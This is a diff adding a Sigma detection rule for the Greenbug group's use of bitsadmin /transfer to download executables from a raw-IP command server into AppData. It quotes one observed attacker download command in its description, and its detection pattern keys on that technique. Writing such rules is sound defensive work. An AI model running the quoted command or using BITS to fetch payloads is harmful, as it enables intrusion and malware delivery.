@@ -1,0 +1,36 @@
+title: Greenbug BITS Job Transfer From External Host to AppData
+id: 3b7d9e12-8a5c-4f61-9d23-7c8b1a4e6f92
+status: experimental
+description: |
+    Detects Greenbug abuse of the Background Intelligent Transfer Service (T1197) to download follow-on
+    executables from its C2 into the user AppData directory, blending the transfer with normal update
+    traffic (observed: bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exe).
+    Keys on bitsadmin.exe /transfer with an external raw-IP/HTTP URL and a local destination path.
+references:
+    - https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia
+author: mena-detection-library
+date: 2026-08-30
+tags:
+    - attack.stealth
+    - attack.t1197
+    - mena-detection-library.greenbug
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_bits:
+        Image|endswith: '\bitsadmin.exe'
+        CommandLine|contains: '/transfer'
+    selection_url:
+        CommandLine|contains:
+            - 'http://'
+            - 'https://'
+    filter_internal:
+        CommandLine|contains:
+            - 'http://localhost'
+            - 'http://127.0.0.1'
+    condition: selection_bits and selection_url and not filter_internal
+falsepositives:
+    - Some enterprise software distribution tools use bitsadmin /transfer against internal update
+      servers - validate the destination host (external raw IP is a strong indicator) and the written file
+level: high
